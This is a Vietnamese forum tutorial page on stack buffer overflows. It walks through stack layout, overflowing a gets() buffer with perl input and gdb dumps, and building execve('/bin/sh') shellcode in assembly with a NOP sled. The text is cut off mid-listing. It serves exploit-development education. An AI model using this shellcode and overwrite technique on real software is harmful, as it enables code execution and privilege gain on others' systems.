<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="description" content="HVA Reading Room">
<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title> - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0" align="center">
	<tr>
        <td width="100%" align="center" valign="middle">
			<a href="http://www.hvaonline.net" title="[Logo]"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
		</td>
	</tr>

	<tr>
		<td>
<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">

		<tr height="15">
			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
		    <th class="thportal" align="center">
				<span class="readingheader">
					 Tìm hiểu đầy đủ về tràn bộ đệm - II <a name="topPage" id="topPage"></a>
				</span>
			</th>
		    <th class="thportal" align="right">
				<a href="/hvaonline/posts/list/0/430.html#1107" target="_blank">
				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: boymc  - Translator:  - Entry Date: 19/02/2009 13:28:59" title="Author: boymc  - Translator:  - Entry Date: 19/02/2009 13:28:59"/>
			</th>
		</tr>
</table>

<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
		<tr>
		    <td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
							<div class="postbody">Tác giả: boymc<br/> <br/> <font color='yellow'><b>Hướng dẫn viết "tràn bộ đệm"</b></font><br/> <br/> Lời mở đầu<br/> <br/> Tràn bộ đệm là một trong những lỗ hỏng bảo mật lớn nhất hiện nay. Vậy tràn bộ đệm là gì? Làm thế nào để thi hành các mã lệnh nguy hiểm qua tràn bộ đệm...?<br/> <br/> ***Lưu ý*** một ít kiến thức về Assembly, C, GDB và Linux là điều cần thiết đối với bạn!<br/> <br/> Sơ đồ tổ chức bộ nhớ của một chương trình<br/> <br/> /------------------\ địa chỉ vùng nhớ cao<br/> | |<br/> | Stack | <br/> | | <br/> |------------------|<br/> | (Initialized) |<br/> | Data |<br/> | (Uninitialized) |<br/> |------------------|<br/> | |<br/> | Text |<br/> | |<br/> \------------------/ địa chỉ vùng nhớ thấp<br/> <br/> Stack và Heap?<br/> <br/> Heap là vùng nhớ dùng để cấp phát cho các biến tỉnh hoặc các vùng nhớ được cấp phát bằng hàm malloc()<br/> <br/> Stack là vùng nhớ dùng để lưu các tham số và các biến cục bộ của hàm.<br/> <br/> Các biến trên heap được cấp phát từ vùng nhớ thấp đến vùng nhớ cao. Trên stack thì hoàn toàn ngược lại, các biến được cấp phát từ vùng nhớ cao đến vùng nhớ thấp.<br/> <br/> Stack hoạt động theo nguyên tắc "vào sau ra trước"(Last In First Out - LIFO). Các giá trị được đẩy vào stack sau cùng sẽ được lấy ra khỏi stack trước tiên.<br/> <br/> PUSH và POP<br/> <br/> Stack đổ từ trên xuống duới(từ vùng nhớ cao đến vùng nhớ thấp). Thanh ghi ESP luôn trỏ đến đỉnh của stack(vùng nhớ có địa chỉ thấp).<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;-- ESP<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> * PUSH một value vào stack<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP cũ<br/> |------------| <br/> (2) -&gt; value | &lt;- ESP mới = ESP cũ - sizeof(value) (1)<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> 1/ ESP=ESP-sizeof(value)<br/> 2/ value được đẩy vào stack <br/> <br/> * POP một value ra khỏi stack<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP mới = ESP cũ + sizeof(value)(2)<br/> |------------| <br/> (1) &lt;- value | &lt;- ESP cũ<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> 1/ vaule được lấy ra khỏi stack<br/> 2/ ESP=ESP+sizeof(value) <br/> <br/> Khác nhau giữa các lệnh hợp ngữ AT&T với Intel<br/> <br/> Khác với MSDOS và WINDOWS, *NIX dùng các lệnh hợp ngữ AT&T. Nó hoàn toàn ngược lại với chuẩn của Intel/Microsoft.<br/> <br/> Ví dụ:<br/> <br/> Intel AT&T <br/> mov eax, esp movl %esp, %eax <br/> push 7 push $7 <br/> mov [esp+5], eax movl %eax, 0x5(%esp) <br/> inc ah incb %ah <br/> push 7 push $7 <br/> ... <br/> <br/> * Ghi chú:<br/> <br/> e - Extended 32 bits<br/> % - register<br/> mov %src, %des<br/> movl - move 1 long<br/> movb - move 1 byte<br/> movw - move 1 word<br/> $ - hằng<br/> # - chú thích<br/> ... <br/> <br/> Cách làm việc của hàm <br/> <br/> Thanh ghi EIP luôn trỏ đến địa chỉ của câu lệnh tiếp theo cần thi hành. <br/> <br/> Khi gọi hàm, đầu tiên các tham số được push vào stack theo thứ tự ngược lại. Tiếp theo địa chỉ của câu lệnh được push vào stack. Sau đó, thanh ghi EBP được push vào stack(dùng để lưu giá trị cũ của EBP). <br/> <br/> Khi kết thúc hàm, thanh ghi EBP được pop ra khỏi stack(phục hồi lại giá trị cũ của EBP). Sau đó địa chỉ trở về(ret address) được pop ra khỏi stack và lệnh tiếp theo sau lời gọi hàm sẽ được thi hành. <br/> <br/> Thanh ghi EBP được dùng để xác định các tham số và các biến cục bộ của hàm. <br/> <br/> Ví dụ:<br/> <br/> test.c<br/> ------------------------------------------------------------------------------<br/> void function(int a, int b, int c) {<br/> char buffer1[5];<br/> char buffer2[10];<br/> }<br/> <br/> void main() {<br/> function(1,2,3);<br/> }<br/> ------------------------------------------------------------------------------<br/> <br/> Để hiểu được chương trình gọi hàm function() như thế nào, bạn hãy compile vidu1.c, dùng tham số -S để phát mã assembly:<br/> <br/> [đt@localhost ~/vicki]$cc -S -o test.s test.c<br/> <br/> Xem file test.s, chúng ta sẽ thấy call function() được chuyển thành:<br/> <br/> pushl $3<br/> pushl $2<br/> pushl $1<br/> call function<br/> <br/> 3 tham số truyền cho function() lần lượt được push vào stack theo thứ tự ngược lại. Câu lệnh 'call' sẽ push con trỏ lệnh(tức là thanh ghi EIP) vào stack để lưu địa chỉ trở về.<br/> <br/> Các lệnh đầu tiêu trong hàm function() sẽ có dạng như sau:<br/> <br/> pushl %ebp<br/> movl %esp,%ebp<br/> subl $20,%esp<br/> <br/> Đầu tiên ESP(frame pointer) được push vào stack. Sau đó chương trình copy ESP vào EBP để tạo một FP pointer mới. Bạn dễ nhận thấy lúc này ESP và EBP đều đang trỏ đến ô nhớ chứa EBP cũ. Hãy ghi nhớ điều này. Tiếp theo ESP được trừ đi 20 để dành không gian cho các biến cục bộ của hàm function()<br/> <br/> Vì chương trình 32 bits nên 5 bytes buffer1 sẽ là 8 bytes(2 words) trong bộ nhớ(do làm tròn đến 4 bytes hay là 32 bits), 10 bytes buffer2 sẽ là 12 bytes trong bộ nhớ(3 words). Tổng cộng sẽ tốn 8+12=20 bytes cho các biến cục bộ của function() nên ESP phải bị trừ đi 20! Stack sẽ có dạng như sau:<br/> <br/> đáy của đỉnh của<br/> bộ nhớ bộ nhớ<br/> buffer2 buffer1 sfp ret a b c<br/> &lt;------ [ ][ ][ ][ ][ ][ ][ ]<br/> <br/> đỉnh của 12 bytes 8 bytes 4b 4b đáy của<br/> stack stack<br/> <br/> Trong hàm function(), nội dung thanh ghi EBP không bị thay đổi.<br/> <br/> 0xz%ebp dùng để xác định ô nhớ chứa tham số của hàm<br/> 0xfffffz%ebp dùng để xác định ô nhớ chứa biến cục bộ của hàm <br/> <br/> Khi kết thúc hàm function():<br/> <br/> movl %ebp,%esp<br/> popl %ebp<br/> ret<br/> movl %ebp, %esp sẽ copy EBP vào ESP. Vì EBP khi bắt đầu hàm trỏ đến ô nhớ chứa EBP cũ và EBP không bị thay đổi trong hàm function() nên sau khi thực hiện lệnh movl, ESP sẽ trỏ đến ô nhớ chứa EBP cũ. popl %ebp sẽ phục hồi lại giá trị cũ cho EBP đồng thời ESP sẽ bị giảm 4(ESP=ESP-sizeof(EBP cũ)) sau lệnh popl. Như vậy ESP sẽ trỏ đến ô nhớ chứa địa chỉ trở về(nằm ngay trên ô nhớ chứa EBP cũ). ret sẽ pop địa chỉ trở về ra khỏi stack, ESP sẽ bị giảm 4 và chương trình tiếp tục thi hành câu lệnh sau lệnh call function().<br/> <br/> Chương trình bị tràn bộ đệm<br/> <br/> Ví dụ:<br/> <br/> gets.c:<br/> ---------------------------------------<br/> int main()<br/> {<br/> char buf[20];<br/> gets(buf);<br/> }<br/> ---------------------------------------<br/> [đt@localhost ~/vicki]$ cc gets.c -o gets<br/> /tmp/cc4C6vaT.o: In function `main':<br/> /tmp/cc4C6vaT.o(.text+0xe): the `gets' function is dangerous and should not be used.<br/> [đt@localhost ~/vicki]$ <br/> gets(buf) sẽ nhận input data vào buf. Kích thước của buf chỉ là 20 bytes. Nếu ta đẩy data có kích thước lớn hơn 20 bytes vào buf, 20 bytes data đầu tiên sẽ vào mảng buf[20], các bytes data sau sẽ ghi đè lên EBP cũ và tiếp theo là ret addr. Như vậy chúng ta có thể thay đổi được địa chỉ trở về, điều này đồng nghĩa với việc chương trình bị tràn bộ đệm.<br/> <br/> đỉnh của bộ nhớ +-------------+ đáy của stack<br/> | return addr |<br/> +-------------+<br/> | EBP cũ |<br/> +-------------+<br/> | |<br/> | |<br/> | buf[20] |<br/> | |<br/> | |<br/> đáy của bộ nhớ +-------------+ đỉnh của stack<br/> Bạn hãy thử:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 24' | ./gets<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // hãy nhìn xem, chúng ta vừa ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x40031100 0x40031100<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> 0x41 chính là "A" ở dạng hex<br/> <br/> Bây giờ bạn hãy thử tiếp:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 28' | ./gets<br/> Segmentation fault<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // chúng ta đã ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x41414141 0x41414141 // chúng ta đã ghi đè lên eip<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> Địa chỉ trở về bị thay đổi thành 0x41414141, chương trình sẽ thi hành các lệnh tại 0x41414141, tuy nhiên đây là vùng cấm nên Linux đã báo lỗi "Segmentation fault"<br/> <br/> Shellcode<br/> <br/> Hình dung các đặt shellcode trên stack<br/> <br/> Ở ví dụ trước, chúng ta đã biết được nguyên nhân của tràn bộ đệm và cách thay đổi eip. Tuy nhiên, chúng ta cần phải thay đổi địa chỉ trở về trỏ đến shellcode để đổ một shell. Bạn có thể hình dung ra cách đặt shellcode trên stack như sau:<br/> <br/> Trước khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ <br/> &lt;----- FFFFF BBBBBBBBBBBBBBBBBBBBB EEEE RRRR FFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> B = buffer<br/> E = stack frame pointer<br/> R = return address<br/> F = các data khác<br/> <br/> Khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF SSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> (1) Lắp tràn bộ đệm(đến return addr) bằng địa chỉ của buffer<br/> (2) Đặt shellcode vào buffer<br/> <br/> Như vậy địa chỉ trở về sẽ trỏ đến shellcode, shellcode sẽ đổ một root shell. Tuy nhiên, thật khó để làm cho ret addr trỏ đến đúng shellcode. Có một cách khác, chúng ta sẽ đặt vào đầu của buffer một dãy lệnh NOP(NO oPeration - không xử lí), tiếp theo chúng ta đẩy shellcode vào sau NOPs. Như vậy khi thay đổi ret addr trỏ đến một nơi này đó ở đầu buffer, các lệnh NOP sẽ được thi hành, chúng không làm gì cả. Đến khi gặp các lệnh shellcode, shellcode sẽ làm nhiệm vụ đổ root shell. Stack có dạng như sau:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF NNNNNNNNNNNSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> N = NOP<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> Viết và test thử shellcode<br/> <br/> Shellcode được đặt trên stack nên không thể nào dùng địa chỉ tuyệt đối. Chúng ta buộc phải dùng địa chỉ tương đối. Thật may cho chúng ta, lệnh jmp và call có thể chấp nhận các địa chỉ tương đối. Shellcode sẽ có dạng như sau:<br/> <br/> 0 jmp (nhảy xuống z bytes, tức là đến câu lệnh call)<br/> 2 popl %esi<br/> ... đăt các hàm tại đây ...<br/> Z call &lt;-Z+2&gt; (call sẽ nhảy lên z-2 bytes, đếb ngay câu lệnh sau jmp, POPL)<br/> Z+5 .string (biến)<br/> Giải thích: ở đầu shellcode chúng ta đặt một lệnh jmp đến call. call sẽ nhảy ngược lên lại câu lệnh ngay sau jmp, tức là câu lệnh popl %esi. Chúng ta đặt các dữ liệu .string ngay sau call. Khi lệnh call được thi hành, nó sẽ push địa chỉ của câu lệnh kế tiếp, trong trường hợp này là địa chỉ của .string vào stack. Câu lệnh ngay sau jmp là popl %esi, như vậy esi sẽ chứa địa chỉ của .string. Chúng ta đặt các hàm cần xử lí giữa popl %esi và call &lt;-z+2&gt;, các hàm này sẽ xác định các dữ liệu .string qua thanh ghi esi.<br/> <br/> Mã lệnh để đổ shell trong C có dạng như sau:<br/> <br/> shellcode.c<br/> -----------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> char *name[2];<br/> <br/> name[0] = "/bin/sh";<br/> name[1] = NULL;<br/> execve(name[0], name, NULL);<br/> }<br/> ------------------------------------------------------------------------------<br/> Để tìm ra mã lệnh assembly thật sự của shellcode, bạn cần compile shellcode.c và sau đó chạy gdb. Nhớ dùng cờ -static khi compile shellcode.c để gộp các mã lệnh assembly thật sự của hàm execve vào, nếu không dùng cờ này, bạn chỉ nhận được một tham chiếu đến thư viện liên kết động của C cho hàm execve.<br/> <br/> [đt@localhost ~/vicki]$ gcc -o shellcode -ggdb -static shellcode.c<br/> [đt@localhost ~/vicki]$ gdb shellcode<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> 0x8000144 : pushl $0x0<br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> 0x8000149 : pushl %eax<br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> 0x800014d : pushl %eax<br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> 0x8000153 : addl $0xc,%esp<br/> 0x8000156 : movl %ebp,%esp<br/> 0x8000158 : popl %ebp<br/> 0x8000159 : ret<br/> End of assembler dump.<br/> (gdb) disas __execve<br/> Dump of assembler code for function __execve:<br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> 0x80002d0 &lt;__execve+20&gt;: movl %eax,%edx<br/> 0x80002d2 &lt;__execve+22&gt;: testl %edx,%edx<br/> 0x80002d4 &lt;__execve+24&gt;: jnl 0x80002e6 &lt;__execve+42&gt;<br/> 0x80002d6 &lt;__execve+26&gt;: negl %edx<br/> 0x80002d8 &lt;__execve+28&gt;: pushl %edx<br/> 0x80002d9 &lt;__execve+29&gt;: call 0x8001a34 &lt;__normal_errno_location&gt;<br/> 0x80002de &lt;__execve+34&gt;: popl %edx<br/> 0x80002df &lt;__execve+35&gt;: movl %edx,(%eax)<br/> 0x80002e1 &lt;__execve+37&gt;: movl $0xffffffff,%eax<br/> 0x80002e6 &lt;__execve+42&gt;: popl %ebx<br/> 0x80002e7 &lt;__execve+43&gt;: movl %ebp,%esp<br/> 0x80002e9 &lt;__execve+45&gt;: popl %ebp<br/> 0x80002ea &lt;__execve+46&gt;: ret<br/> 0x80002eb &lt;__execve+47&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> Giải thích:<br/> <br/> 1/ main():<br/> <br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> Các lệnh này bạn đã viết rồi. Nó sẽ lưu frame pointer cũ và tạo frame pointer mới từ stack pointer, sau đó dành chổ cho các biến cục bộ của main() trên stack, trong trường hợp này là 8 bytes:<br/> <br/> char *name[2];<br/> <br/> 2 con trỏ kiểu char, mỗi con trỏ dài 1 word nên phải tốn 2 word, tức là 8 bytes trên stack.<br/> <br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> copy giá trị 0x80027b8(địa chỉ của chuổi "/bin/sh") vào con trỏ đầu tiên của mảng con trỏ name[]. Câu lệnh này tương đương với:<br/> <br/> name[0] = "/bin/sh";<br/> <br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> copy giá trị 0x0(NULL) vào con trỏ thứ 2 của name[]. Câu lệnh này tương đương với:<br/> <br/> name[1] = NULL;<br/> <br/> Mã lệnh thật sự để call execve() bắt đầu tại đây:<br/> <br/> 0x8000144 : pushl $0x0<br/> push các tham số của hàm execve() vào stack theo thứ tự ngược lại, đầu tiên là NULL<br/> <br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của name[] vào thanh ghi EAX<br/> <br/> 0x8000149 : pushl %eax<br/> push địa chỉ của name[] vào stack<br/> <br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của chuổi "/bin/sh" vào stack<br/> <br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> gọi hàm thư viện execve(). call sẽ push eip vào stack.<br/> <br/> 2/ execve():<br/> <br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> đây là phần mở đầu của hàm, tôi không cần giải thích cho bạn nữa <br/> <br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> copy 0xb(11 decimal) vào stack. 11 = execve()<br/> <br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> copy địa chỉ của "/bin/sh" vào EBX<br/> <br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> copy địa chỉ của name[] vào ECX<br/> <br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> copy địa chỉ của con trỏ null vào EDX <br/> <br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> gọi ngắt $0x80 <br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80 <br/> <br/> Sau khi thi hành call execve, chương trình có thể thi hành tiếp các câu lệnh rác còn lại trên stack và chương trình có thể thất bại. Vì vậy, chúng ta phải nhanh chóng kết thúc chương trình bằng lời gọi hàm exit(). Exit syscall trong C có dạng như sau:<br/> <br/> exit.c<br/> ------------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> exit(0);<br/> }<br/> ------------------------------------------------------------------------------<br/> Xem mã assemly của hàm exit():<br/> <br/> [đt@localhost ~/vicki]$ gcc -o exit -ggdb -static exit.c<br/> [đt@localhost ~/vicki]$ gdb exit<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas _exit<br/> Dump of assembler code for function _exit:<br/> 0x800034c &lt;_exit&gt;: pushl %ebp<br/> 0x800034d &lt;_exit+1&gt;: movl %esp,%ebp<br/> 0x800034f &lt;_exit+3&gt;: pushl %ebx<br/> 0x8000350 &lt;_exit+4&gt;: movl $0x1,%eax<br/> 0x8000355 &lt;_exit+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x8000358 &lt;_exit+12&gt;: int $0x80<br/> 0x800035a &lt;_exit+14&gt;: movl 0xfffffffc(%ebp),%ebx<br/> 0x800035d &lt;_exit+17&gt;: movl %ebp,%esp<br/> 0x800035f &lt;_exit+19&gt;: popl %ebp<br/> 0x8000360 &lt;_exit+20&gt;: ret<br/> 0x8000361 &lt;_exit+21&gt;: nop<br/> 0x8000362 &lt;_exit+22&gt;: nop<br/> 0x8000363 &lt;_exit+23&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> exit syscall sẽ đặt 0x1 vào EAX, đặt exit code trong EBX và gọi ngắt "int 0x80". exit code = 0 nghĩa là không gặp lỗi. Vì vậy chúng ta sẽ đặt 0 trong EBX.<br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80<br/> h/ copy 0x1 vào thanh ghi EAX<br/> i/ copy 0x0 vào thanh ghi EBX<br/> j/ gọi ngắt $0x80 <br/> <br/> Shellcode sẽ có dạng như sau:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp offset-to-call # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,array-offset(%esi) # 3 bytes<br/> movb $0x0,nullbyteoffset(%esi)# 4 bytes<br/> movl $0x0,null-offset(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal array-offset,(%esi),%ecx # 3 bytes<br/> leal null-offset(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call offset-to-popl # 5 bytes<br/> /bin/sh string goes here.<br/> ------------------------------------------------------------------------------<br/> Tính toán các offsets từ jmp đến call, từ call đến popl, từ địa chỉ của chuổi đến mảng, và từ địa chỉ của chuổi đến word null, chúng ta sẽ có shellcode thật sự:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp 0x26 # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2b # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> ------------------------------------------------------------------------------<br/> Để biết mã máy của các lệnh hợp ngữ trên ở dạng hexa, bạn cần compile shellcodeasm.c và gdb shellcodeasm:<br/> <br/> shellcodeasm.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x2a # 3 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2f # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c<br/> [đt@localhost ~/vicki]$ gdb shellcodeasm<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute 